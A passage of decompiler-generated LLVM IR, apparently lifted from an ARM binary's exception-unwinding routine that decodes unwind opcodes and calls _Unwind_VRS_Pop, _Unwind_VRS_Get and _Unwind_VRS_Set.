  store i32 %v2_1a490, i32* %r3.global-to-local, align 4
  %v2_1a494 = trunc i32 %v2_1a490 to i8
  store i8 %v2_1a494, i8* %v2_1a488, align 1
  %v0_1a498.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a498.pr.pr, label %.thread48.dec_label_pc_1a49c_crit_edge, label %dec_label_pc_1a4d0

.thread48.dec_label_pc_1a49c_crit_edge:           ; preds = %.thread48
  %v0_1a49c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a49c

dec_label_pc_1a49c:                               ; preds = %.thread48.dec_label_pc_1a49c_crit_edge, %dec_label_pc_1a488
  %v2_1a4b4 = phi i32 [ %v0_1a49c.pre, %.thread48.dec_label_pc_1a49c_crit_edge ], [ %v0_1a488, %dec_label_pc_1a488 ]
  %v1_1a49c = add i32 %v2_1a4b4, 9
  %v2_1a49c = inttoptr i32 %v1_1a49c to i8*
  %v3_1a49c = load i8, i8* %v2_1a49c, align 1
  %v4_1a49c = zext i8 %v3_1a49c to i32
  store i32 %v4_1a49c, i32* %r3.global-to-local, align 4
  %v2_1a4a0 = icmp eq i8 %v3_1a49c, 0
  store i1 %v2_1a4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4a0, label %dec_label_pc_1a4ec, label %dec_label_pc_1a4b0

dec_label_pc_1a4b0:                               ; preds = %dec_label_pc_1a49c
  %v1_1a4b0 = add nsw i32 %v4_1a49c, -1
  store i32 %v1_1a4b0, i32* %r3.global-to-local, align 4
  %v1_1a4b4 = trunc i32 %v1_1a4b0 to i8
  store i8 %v1_1a4b4, i8* %v2_1a49c, align 1
  %v0_1a4b8 = load i32, i32* @r5, align 4
  %v1_1a4b8 = add i32 %v0_1a4b8, 4
  %v2_1a4b8 = inttoptr i32 %v1_1a4b8 to i32*
  %v3_1a4b8 = load i32, i32* %v2_1a4b8, align 4
  store i32 %v3_1a4b8, i32* %r2.global-to-local, align 4
  %v1_1a4bc = inttoptr i32 %v3_1a4b8 to i32*
  %v2_1a4bc = load i32, i32* %v1_1a4bc, align 4
  store i32 %v2_1a4bc, i32* %r0.global-to-local, align 4
  %v4_1a4bc = add i32 %v3_1a4b8, 4
  store i32 %v4_1a4bc, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a4bc, i32* %v2_1a4b8, align 4
  %v0_1a4c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4c8 = trunc i32 %v0_1a4c8 to i8
  %v2_1a4c8 = load i32, i32* @r5, align 4
  %v3_1a4c8 = add i32 %v2_1a4c8, 8
  %v4_1a4c8 = inttoptr i32 %v3_1a4c8 to i8*
  store i8 %v1_1a4c8, i8* %v4_1a4c8, align 1
  %v0_1a4cc = load i32, i32* %r0.global-to-local, align 4
  %v1_1a4cc = load i32, i32* @r5, align 4
  %v2_1a4cc = inttoptr i32 %v1_1a4cc to i32*
  store i32 %v0_1a4cc, i32* %v2_1a4cc, align 4
  br label %dec_label_pc_1a4d0

dec_label_pc_1a4d0:                               ; preds = %.thread48, %dec_label_pc_1a4b0
  %v0_1a4d0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a4d0 = udiv i32 %v0_1a4d0, 16777216
  %v1_1a4d4 = urem i32 %v3_1a4d0, 16
  %v3_1a4d8 = mul i32 %v0_1a4d0, 256
  store i32 %v3_1a4d8, i32* %r0.global-to-local, align 4
  %v1_1a4dc = add nuw nsw i32 %v1_1a4d4, 1
  store i32 %v1_1a4dc, i32* %r2.global-to-local, align 4
  %v1_1a4e0 = and i32 %v3_1a4d0, 240
  store i32 %v1_1a4e0, i32* %r3.global-to-local, align 4
  %v1_1a4e4 = load i32, i32* @r5, align 4
  %v2_1a4e4 = inttoptr i32 %v1_1a4e4 to i32*
  store i32 %v3_1a4d8, i32* %v2_1a4e4, align 4
  %v0_1a4e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a4e8 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a4e8 = mul i32 %v1_1a4e8, 4096
  %v5_1a4e8 = or i32 %v4_1a4e8, %v0_1a4e8
  br label %dec_label_pc_1a4ec

dec_label_pc_1a4ec:                               ; preds = %dec_label_pc_1a49c, %dec_label_pc_1a4d0
  %storemerge131 = phi i32 [ %v5_1a4e8, %dec_label_pc_1a4d0 ], [ 720897, %dec_label_pc_1a49c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a4f4:                               ; preds = %dec_label_pc_1a2b0
  %v0_1a4f4 = load i32, i32* @r5, align 4
  %v1_1a4f4 = add i32 %v0_1a4f4, 8
  %v2_1a4f4 = inttoptr i32 %v1_1a4f4 to i8*
  %v3_1a4f4 = load i8, i8* %v2_1a4f4, align 1
  %v4_1a4f4 = zext i8 %v3_1a4f4 to i32
  store i32 %v4_1a4f4, i32* %r3.global-to-local, align 4
  %v2_1a4f8 = icmp eq i8 %v3_1a4f4, 0
  store i1 %v2_1a4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4f8, label %dec_label_pc_1a508, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_1a4f4
  %v2_1a4fc = add nsw i32 %v4_1a4f4, -1
  store i32 %v2_1a4fc, i32* %r3.global-to-local, align 4
  %v2_1a500 = trunc i32 %v2_1a4fc to i8
  store i8 %v2_1a500, i8* %v2_1a4f4, align 1
  %v0_1a504.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a504.pr.pr, label %.thread52.dec_label_pc_1a508_crit_edge, label %dec_label_pc_1a53c

.thread52.dec_label_pc_1a508_crit_edge:           ; preds = %.thread52
  %v0_1a508.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a508

dec_label_pc_1a508:                               ; preds = %.thread52.dec_label_pc_1a508_crit_edge, %dec_label_pc_1a4f4
  %v2_1a520 = phi i32 [ %v0_1a508.pre, %.thread52.dec_label_pc_1a508_crit_edge ], [ %v0_1a4f4, %dec_label_pc_1a4f4 ]
  %v1_1a508 = add i32 %v2_1a520, 9
  %v2_1a508 = inttoptr i32 %v1_1a508 to i8*
  %v3_1a508 = load i8, i8* %v2_1a508, align 1
  %v4_1a508 = zext i8 %v3_1a508 to i32
  store i32 %v4_1a508, i32* %r3.global-to-local, align 4
  %v2_1a50c = icmp eq i8 %v3_1a508, 0
  store i1 %v2_1a50c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a50c, label %dec_label_pc_1a558, label %dec_label_pc_1a51c

dec_label_pc_1a51c:                               ; preds = %dec_label_pc_1a508
  %v1_1a51c = add nsw i32 %v4_1a508, -1
  store i32 %v1_1a51c, i32* %r3.global-to-local, align 4
  %v1_1a520 = trunc i32 %v1_1a51c to i8
  store i8 %v1_1a520, i8* %v2_1a508, align 1
  %v0_1a524 = load i32, i32* @r5, align 4
  %v1_1a524 = add i32 %v0_1a524, 4
  %v2_1a524 = inttoptr i32 %v1_1a524 to i32*
  %v3_1a524 = load i32, i32* %v2_1a524, align 4
  store i32 %v3_1a524, i32* %r2.global-to-local, align 4
  %v1_1a528 = inttoptr i32 %v3_1a524 to i32*
  %v2_1a528 = load i32, i32* %v1_1a528, align 4
  store i32 %v2_1a528, i32* %r0.global-to-local, align 4
  %v4_1a528 = add i32 %v3_1a524, 4
  store i32 %v4_1a528, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a528, i32* %v2_1a524, align 4
  %v0_1a534 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a534 = trunc i32 %v0_1a534 to i8
  %v2_1a534 = load i32, i32* @r5, align 4
  %v3_1a534 = add i32 %v2_1a534, 8
  %v4_1a534 = inttoptr i32 %v3_1a534 to i8*
  store i8 %v1_1a534, i8* %v4_1a534, align 1
  %v0_1a538 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a538 = load i32, i32* @r5, align 4
  %v2_1a538 = inttoptr i32 %v1_1a538 to i32*
  store i32 %v0_1a538, i32* %v2_1a538, align 4
  br label %dec_label_pc_1a53c

dec_label_pc_1a53c:                               ; preds = %.thread52, %dec_label_pc_1a51c
  %v0_1a53c = load i32, i32* %r0.global-to-local, align 4
  %v3_1a53c = udiv i32 %v0_1a53c, 16777216
  %v1_1a540 = urem i32 %v3_1a53c, 16
  %v3_1a544 = mul i32 %v0_1a53c, 256
  store i32 %v3_1a544, i32* %r0.global-to-local, align 4
  %v1_1a548 = add nuw nsw i32 %v1_1a540, 1
  store i32 %v1_1a548, i32* %r2.global-to-local, align 4
  %v1_1a54c = and i32 %v3_1a53c, 240
  store i32 %v1_1a54c, i32* %r3.global-to-local, align 4
  %v1_1a550 = load i32, i32* @r5, align 4
  %v2_1a550 = inttoptr i32 %v1_1a550 to i32*
  store i32 %v3_1a544, i32* %v2_1a550, align 4
  %v0_1a554 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a554 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a554 = mul i32 %v1_1a554, 4096
  %v5_1a554 = or i32 %v4_1a554, %v0_1a554
  br label %dec_label_pc_1a558

dec_label_pc_1a558:                               ; preds = %dec_label_pc_1a508, %dec_label_pc_1a53c
  %storemerge130 = phi i32 [ %v5_1a554, %dec_label_pc_1a53c ], [ 720897, %dec_label_pc_1a508 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a36c

dec_label_pc_1a560:                               ; preds = %dec_label_pc_1a28c
  %v0_1a560 = load i32, i32* @r5, align 4
  %v1_1a560 = add i32 %v0_1a560, 8
  %v2_1a560 = inttoptr i32 %v1_1a560 to i8*
  %v3_1a560 = load i8, i8* %v2_1a560, align 1
  %v4_1a560 = zext i8 %v3_1a560 to i32
  store i32 %v4_1a560, i32* %r3.global-to-local, align 4
  %v2_1a564 = icmp eq i8 %v3_1a560, 0
  store i1 %v2_1a564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a564, label %dec_label_pc_1a70c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1a560
  %v2_1a568 = add nsw i32 %v4_1a560, -1
  store i32 %v2_1a568, i32* %r3.global-to-local, align 4
  %v2_1a56c = trunc i32 %v2_1a568 to i8
  store i8 %v2_1a56c, i8* %v2_1a560, align 1
  %v0_1a570.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a570.pr.pr, label %.thread56.dec_label_pc_1a70c_crit_edge, label %dec_label_pc_1a574

.thread56.dec_label_pc_1a70c_crit_edge:           ; preds = %.thread56
  %v0_1a70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a70c

dec_label_pc_1a574:                               ; preds = %.thread56, %dec_label_pc_1a718
  %v0_1a574 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a574 = udiv i32 %v0_1a574, 16777216
  store i32 %v3_1a574, i32* %r3.global-to-local, align 4
  store i32 %v3_1a574, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_1a574, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1a57c = mul i32 %v0_1a574, 256
  store i32 %v3_1a57c, i32* %r0.global-to-local, align 4
  %v1_1a580 = load i32, i32* @r5, align 4
  %v2_1a580 = inttoptr i32 %v1_1a580 to i32*
  store i32 %v3_1a57c, i32* %v2_1a580, align 4
  br i1 %tmp184, label %dec_label_pc_1a33c, label %dec_label_pc_1a588

dec_label_pc_1a588:                               ; preds = %dec_label_pc_1a574
  %v0_1a588 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a588 = and i32 %v0_1a588, 240
  store i32 %v1_1a588, i32* %r3.global-to-local, align 4
  %v2_1a588 = icmp eq i32 %v1_1a588, 0
  store i1 %v2_1a588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a588, label %dec_label_pc_1a590, label %dec_label_pc_1a33c

dec_label_pc_1a590:                               ; preds = %dec_label_pc_1a588
  %v0_1a590 = load i32, i32* @r7, align 4
  store i32 %v0_1a590, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_1a598 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a598 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a590, i32 4, i32 %v2_1a598, i32 0)
  store i32 %v4_1a598, i32* %r0.global-to-local, align 4
  %v2_1a59c = icmp eq i32 %v4_1a598, 0
  store i1 %v2_1a59c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a59c, label %dec_label_pc_1a06c.backedge, label %dec_label_pc_1a5a4

dec_label_pc_1a5a4:                               ; preds = %dec_label_pc_1a590
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a194

dec_label_pc_1a5ac:                               ; preds = %dec_label_pc_1a3d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a5b8 = load i32, i32* @r7, align 4
  store i32 %v0_1a5b8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_1a5c4 = call i32 @_Unwind_VRS_Get(i32 %v0_1a5b8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a5c4, i32* %r0.global-to-local, align 4
  %v0_1a5c8 = load i32, i32* @r5, align 4
  %v1_1a5c8 = add i32 %v0_1a5c8, 8
  %v2_1a5c8 = inttoptr i32 %v1_1a5c8 to i8*
  %v3_1a5c8 = load i8, i8* %v2_1a5c8, align 1
  %v4_1a5c8 = zext i8 %v3_1a5c8 to i32
  store i32 %v4_1a5c8, i32* %r1.global-to-local, align 4
  %v2_1a5cc = icmp eq i8 %v3_1a5c8, 0
  store i1 %v2_1a5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5cc, label %dec_label_pc_1a5dc, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1a5ac
  %v2_1a5d0 = add nsw i32 %v4_1a5c8, -1
  store i32 %v2_1a5d0, i32* %r3.global-to-local, align 4
  %v2_1a5d4 = trunc i32 %v2_1a5d0 to i8
  store i8 %v2_1a5d4, i8* %v2_1a5c8, align 1
  %v0_1a5d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a5d8.pr.pr, label %.thread58.dec_label_pc_1a5dc_crit_edge, label %dec_label_pc_1a608

.thread58.dec_label_pc_1a5dc_crit_edge:           ; preds = %.thread58
  %v0_1a5dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a5dc

dec_label_pc_1a5dc:                               ; preds = %.thread58.dec_label_pc_1a5dc_crit_edge, %dec_label_pc_1a5ac
  %v2_1a5f0 = phi i32 [ %v0_1a5dc.pre, %.thread58.dec_label_pc_1a5dc_crit_edge ], [ %v0_1a5c8, %dec_label_pc_1a5ac ]
  %v1_1a5dc = add i32 %v2_1a5f0, 9
  %v2_1a5dc = inttoptr i32 %v1_1a5dc to i8*
  %v3_1a5dc = load i8, i8* %v2_1a5dc, align 1
  %v4_1a5dc = zext i8 %v3_1a5dc to i32
  store i32 %v4_1a5dc, i32* %r3.global-to-local, align 4
  %v2_1a5e0 = icmp eq i8 %v3_1a5dc, 0
  store i1 %v2_1a5e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5e0, label %bb158, label %dec_label_pc_1a5ec

bb158:                                            ; preds = %dec_label_pc_1a5dc
  %v1_1a5e4 = load i32, i32* @r6, align 4
  store i32 %v1_1a5e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a630

dec_label_pc_1a5ec:                               ; preds = %dec_label_pc_1a5dc
  %v1_1a5ec = add nsw i32 %v4_1a5dc, -1
  store i32 %v1_1a5ec, i32* %r3.global-to-local, align 4
  %v1_1a5f0 = trunc i32 %v1_1a5ec to i8
  store i8 %v1_1a5f0, i8* %v2_1a5dc, align 1
  %v0_1a5f4 = load i32, i32* @r5, align 4
  %v1_1a5f4 = add i32 %v0_1a5f4, 4
  %v2_1a5f4 = inttoptr i32 %v1_1a5f4 to i32*
  %v3_1a5f4 = load i32, i32* %v2_1a5f4, align 4
  store i32 %v3_1a5f4, i32* %r2.global-to-local, align 4
  %v1_1a5f8 = inttoptr i32 %v3_1a5f4 to i32*
  %v2_1a5f8 = load i32, i32* %v1_1a5f8, align 4
  store i32 %v2_1a5f8, i32* %r0.global-to-local, align 4
  %v4_1a5f8 = add i32 %v3_1a5f4, 4
  store i32 %v4_1a5f8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1a600 = inttoptr i32 %v0_1a5f4 to i32*
  store i32 %v2_1a5f8, i32* %v1_1a600, align 4
  %v5_1a600 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a600, i32* %v2_1a5f4, align 4
  %v0_1a604 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a604 = trunc i32 %v0_1a604 to i8
  %v2_1a604 = load i32, i32* @r5, align 4
  %v3_1a604 = add i32 %v2_1a604, 8
  %v4_1a604 = inttoptr i32 %v3_1a604 to i8*
  store i8 %v1_1a604, i8* %v4_1a604, align 1
  br label %dec_label_pc_1a608

dec_label_pc_1a608:                               ; preds = %.thread58, %dec_label_pc_1a5ec
  %v0_1a608 = load i32, i32* @r5, align 4
  %v1_1a608 = inttoptr i32 %v0_1a608 to i32*
  %v2_1a608 = load i32, i32* %v1_1a608, align 4
  store i32 %v2_1a608, i32* %r3.global-to-local, align 4
  %v3_1a60c = mul i32 %v2_1a608, 256
  store i32 %v3_1a60c, i32* %r0.global-to-local, align 4
  %v3_1a610 = udiv i32 %v2_1a608, 16777216
  store i32 %v3_1a610, i32* %r2.global-to-local, align 4
  store i32 %v3_1a60c, i32* %v1_1a608, align 4
  %v0_1a618 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a618 = and i32 %v0_1a618, 128
  %v2_1a618 = icmp eq i32 %v1_1a618, 0
  store i1 %v2_1a618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a618, label %.thread129, label %dec_label_pc_1a62c

.thread129:                                       ; preds = %dec_label_pc_1a608
  %v4_1a61c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1a61c, i32* %ip.global-to-local, align 4
  %v1_1a620 = urem i32 %v0_1a618, 256
  store i32 %v1_1a620, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1a6a0

dec_label_pc_1a62c:                               ; preds = %dec_label_pc_1a608
  %v1_1a62063 = urem i32 %v0_1a618, 256
  store i32 %v1_1a62063, i32* %r2.global-to-local, align 4
  %v0_1a62c = load i32, i32* @r5, align 4
  %v1_1a62c = add i32 %v0_1a62c, 8
  %v2_1a62c = inttoptr i32 %v1_1a62c to i8*
  %v3_1a62c = load i8, i8* %v2_1a62c, align 1
  %v4_1a62c = zext i8 %v3_1a62c to i32
  store i32 %v4_1a62c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a630

dec_label_pc_1a630:                               ; preds = %bb158, %dec_label_pc_1a62c
  %v3_1a65099 = phi i32 [ %v2_1a5f0, %bb158 ], [ %v0_1a62c, %dec_label_pc_1a62c ]
  %v0_1a63892 = phi i32 [ %v1_1a5e4, %bb158 ], [ %v1_1a62063, %dec_label_pc_1a62c ]
  %v3_1a630 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1a630, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a638

dec_label_pc_1a638:                               ; preds = %dec_label_pc_1a638.backedge, %dec_label_pc_1a630
  %v3_1a650 = phi i32 [ %v3_1a650100, %dec_label_pc_1a638.backedge ], [ %v3_1a65099, %dec_label_pc_1a630 ]
  %v0_1a64c = phi i32 [ %v2_1a63c.pre, %dec_label_pc_1a638.backedge ], [ 2, %dec_label_pc_1a630 ]
  %v0_1a63c = phi i32 [ %v0_1a63c.pre, %dec_label_pc_1a638.backedge ], [ %v3_1a630, %dec_label_pc_1a630 ]
  %v0_1a638 = phi i32 [ %v0_1a63895, %dec_label_pc_1a638.backedge ], [ %v0_1a63892, %dec_label_pc_1a630 ]
  %v1_1a638 = urem i32 %v0_1a638, 128
  %v7_1a63c = shl i32 %v1_1a638, %v0_1a64c
  %v8_1a63c = add i32 %v7_1a63c, %v0_1a63c
  store i32 %v8_1a63c, i32* %ip.global-to-local, align 4
  %v0_1a640 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a640 = icmp eq i32 %v0_1a640, 0
  store i1 %v2_1a640, i1* %cpsr_z.global-to-local, align 1
  %v1_1a644 = add i32 %v0_1a640, -1
  store i32 %v1_1a644, i32* %r3.global-to-local, align 4
  store i32 %v8_1a63c, i32* %stack_var_-36, align 4
  %v1_1a64c = add i32 %v0_1a64c, 7
  store i32 %v1_1a64c, i32* @lr, align 4
  br i1 %v2_1a640, label %dec_label_pc_1a658, label %bb159

bb159:                                            ; preds = %dec_label_pc_1a638
  %v2_1a650 = trunc i32 %v1_1a644 to i8
  %v4_1a650 = add i32 %v3_1a650, 8
  %v5_1a650 = inttoptr i32 %v4_1a650 to i8*
  store i8 %v2_1a650, i8* %v5_1a650, align 1
  %v0_1a654.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a654.pr, label %.dec_label_pc_1a658_crit_edge, label %dec_label_pc_1a684

.dec_label_pc_1a658_crit_edge:                    ; preds = %bb159
  %v0_1a658.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a658

dec_label_pc_1a658:                               ; preds = %.dec_label_pc_1a658_crit_edge, %dec_label_pc_1a638
  %v2_1a670 = phi i32 [ %v0_1a658.pre, %.dec_label_pc_1a658_crit_edge ], [ %v3_1a650, %dec_label_pc_1a638 ]
  %v1_1a658 = add i32 %v2_1a670, 9
  %v2_1a658 = inttoptr i32 %v1_1a658 to i8*
  %v3_1a658 = load i8, i8* %v2_1a658, align 1
  %v4_1a658 = zext i8 %v3_1a658 to i32
  store i32 %v4_1a658, i32* %r3.global-to-local, align 4
  %v2_1a65c = icmp eq i8 %v3_1a658, 0
  store i1 %v2_1a65c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a660 = add nsw i32 %v4_1a658, -1
  store i32 %v1_1a660, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1a65c, label %dec_label_pc_1a638.backedge, label %dec_label_pc_1a66c

dec_label_pc_1a66c:                               ; preds = %dec_label_pc_1a658
  %v1_1a66c = add i32 %v2_1a670, 4
  %v2_1a66c = inttoptr i32 %v1_1a66c to i32*
  %v3_1a66c = load i32, i32* %v2_1a66c, align 4
  store i32 %v3_1a66c, i32* %r2.global-to-local, align 4
  %v1_1a670 = trunc i32 %v1_1a660 to i8
  store i8 %v1_1a670, i8* %v2_1a658, align 1
  %v0_1a674 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a674 = inttoptr i32 %v0_1a674 to i32*
  %v2_1a674 = load i32, i32* %v1_1a674, align 4
  store i32 %v2_1a674, i32* %r0.global-to-local, align 4
  %v4_1a674 = add i32 %v0_1a674, 4
  store i32 %v4_1a674, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1a67c = load i32, i32* @r5, align 4
  %v3_1a67c = add i32 %v2_1a67c, 8
  %v4_1a67c = inttoptr i32 %v3_1a67c to i8*
  store i8 3, i8* %v4_1a67c, align 1
  %v0_1a680 = load i32, i32* @r5, align 4
  %v1_1a680 = inttoptr i32 %v0_1a680 to i32*
  %v2_1a680 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1a680, i32* %v1_1a680, align 4
  %v3_1a680 = add i32 %v0_1a680, 4
  %v4_1a680 = inttoptr i32 %v3_1a680 to i32*
  %v5_1a680 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a680, i32* %v4_1a680, align 4
  br label %dec_label_pc_1a684

dec_label_pc_1a684:                               ; preds = %bb159, %dec_label_pc_1a66c
  %v0_1a684 = load i32, i32* @r5, align 4
  %v1_1a684 = inttoptr i32 %v0_1a684 to i32*
  %v2_1a684 = load i32, i32* %v1_1a684, align 4
  store i32 %v2_1a684, i32* %r3.global-to-local, align 4
  %v3_1a688 = udiv i32 %v2_1a684, 16777216
  store i32 %v3_1a688, i32* %r2.global-to-local, align 4
  %v1_1a68c = and i32 %v3_1a688, 128
  %v2_1a68c = icmp eq i32 %v1_1a68c, 0
  store i1 %v2_1a68c, i1* %cpsr_z.global-to-local, align 1
  %v3_1a690 = mul i32 %v2_1a684, 256
  store i32 %v3_1a690, i32* %r0.global-to-local, align 4
  store i32 %v3_1a690, i32* %v1_1a684, align 4
  %v0_1a698 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a698 = urem i32 %v0_1a698, 256
  store i32 %v1_1a698, i32* %r2.global-to-local, align 4
  br i1 %v2_1a68c, label %dec_label_pc_1a6a0.loopexit, label %dec_label_pc_1a6cc

dec_label_pc_1a6a0.loopexit:                      ; preds = %dec_label_pc_1a684
  %v0_1a6a4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1a6a8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a6a0

dec_label_pc_1a6a0:                               ; preds = %dec_label_pc_1a6a0.loopexit, %.thread129
  %v2_1a6a8 = phi i32 [ 2, %.thread129 ], [ %v2_1a6a8.pre, %dec_label_pc_1a6a0.loopexit ]
  %v0_1a6a4 = phi i32 [ %v4_1a61c, %.thread129 ], [ %v0_1a6a4.pre, %dec_label_pc_1a6a0.loopexit ]
  %v0_1a6a0 = phi i32 [ %v1_1a620, %.thread129 ], [ %v1_1a698, %dec_label_pc_1a6a0.loopexit ]
  %v1_1a6a0 = urem i32 %v0_1a6a0, 128
  %v1_1a6a4 = add i32 %v0_1a6a4, 516
  %v7_1a6a8 = shl i32 %v1_1a6a0, %v2_1a6a8
  %v8_1a6a8 = add i32 %v1_1a6a4, %v7_1a6a8
  store i32 %v8_1a6a8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a6b0 = load i32, i32* @r7, align 4
  store i32 %v0_1a6b0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_1a6a8, i32* %stack_var_-36, align 4
  %v5_1a6c4 = call i32 @_Unwind_VRS_Set(i32 %v0_1a6b0, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a6c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a06c.backedge

dec_label_pc_1a6cc:                               ; preds = %dec_label_pc_1a684
  %v0_1a6cc = load i32, i32* @r5, align 4
  %v1_1a6cc = add i32 %v0_1a6cc, 8
  %v2_1a6cc = inttoptr i32 %v1_1a6cc to i8*
  %v3_1a6cc = load i8, i8* %v2_1a6cc, align 1
  %v4_1a6cc = zext i8 %v3_1a6cc to i32
  store i32 %v4_1a6cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a638.backedge

dec_label_pc_1a638.backedge:                      ; preds = %dec_label_pc_1a6cc, %dec_label_pc_1a658
  %v3_1a650100 = phi i32 [ %v0_1a6cc, %dec_label_pc_1a6cc ], [ %v2_1a670, %dec_label_pc_1a658 ]
  %v0_1a63895 = phi i32 [ %v1_1a698, %dec_label_pc_1a6cc ], [ 176, %dec_label_pc_1a658 ]
  %v0_1a63c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1a63c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a638

dec_label_pc_1a6d4:                               ; preds = %dec_label_pc_1a3d0
  %v0_1a6d4 = load i32, i32* @r5, align 4
  %v1_1a6d4 = add i32 %v0_1a6d4, 8
  %v2_1a6d4 = inttoptr i32 %v1_1a6d4 to i8*
  %v3_1a6d4 = load i8, i8* %v2_1a6d4, align 1
  %v4_1a6d4 = zext i8 %v3_1a6d4 to i32
  store i32 %v4_1a6d4, i32* %r3.global-to-local, align 4
  %v2_1a6d8 = icmp eq i8 %v3_1a6d4, 0
  store i1 %v2_1a6d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a6d8, label %dec_label_pc_1a73c, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_1a6d4
  %v2_1a6dc = add nsw i32 %v4_1a6d4, -1
  store i32 %v2_1a6dc, i32* %r3.global-to-local, align 4
  %v2_1a6e0 = trunc i32 %v2_1a6dc to i8
  store i8 %v2_1a6e0, i8* %v2_1a6d4, align 1
  %v0_1a6e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a6e4.pr.pr, label %.thread66.dec_label_pc_1a73c_crit_edge, label %dec_label_pc_1a6e8

.thread66.dec_label_pc_1a73c_crit_edge:           ; preds = %.thread66
  %v0_1a73c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a73c

dec_label_pc_1a6e8:                               ; preds = %.thread66, %dec_label_pc_1a748
  %v0_1a6e8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a6e8 = udiv i32 %v0_1a6e8, 16777216
  store i32 %v3_1a6e8, i32* %r3.global-to-local, align 4
  store i32 %v3_1a6e8, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_1a6e8, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_1a6f0 = mul i32 %v0_1a6e8, 256
  store i32 %v3_1a6f0, i32* %r0.global-to-local, align 4
  %v1_1a6f4 = load i32, i32* @r5, align 4
  %v2_1a6f4 = inttoptr i32 %v1_1a6f4 to i32*
